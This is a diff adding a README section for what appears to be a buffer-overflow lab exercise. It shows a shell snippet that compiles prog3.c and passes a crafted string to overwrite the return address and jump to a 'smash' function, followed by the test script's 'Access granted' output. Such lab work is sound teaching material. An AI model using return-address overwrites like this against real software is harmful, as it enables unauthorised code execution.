@@ -46,3 +46,21 @@ E.g.:
 SEGFAULT incoming
 1234567890HALLO HALLO
 
+### prog3.c
+
+Jump to the address of the `smash` function by overwriting the return address in the stack:
+
+```sh
+#! /bin/bash
+gcc -o prog3 prog3.c
+./prog3 "thisisjustaninnocentbufferhihi:)@"
+```
+
+It can be tested with the provided script `prog3_smash.sh`:
+
+```sh
+$ ./prog3_smash.sh
+Access granted. Gonna cry?
+You should have thought of that earlier.
+
+```
